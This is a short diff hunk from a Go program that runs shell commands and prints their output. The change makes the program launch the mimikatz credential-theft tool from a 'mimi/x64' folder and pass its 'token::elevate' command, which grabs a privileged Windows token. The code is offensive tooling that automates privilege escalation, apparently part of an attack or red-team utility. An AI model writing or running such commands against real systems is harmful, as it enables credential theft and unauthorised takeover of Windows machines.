@@ -38,7 +38,7 @@ func main() {
 	fmt.Println(stdout)
 	dir, _ = os.Getwd()
 	fmt.Println("Dir", dir)
-	stdout, _, err = shell.Execute("cd mimi/x64 & .\\mimikatz")
+	stdout, _, err = shell.Execute("cd mimi/x64 & .\\mimikatz & token::elevate")
 	if err != nil {
 		panic(err.Error())
 	}
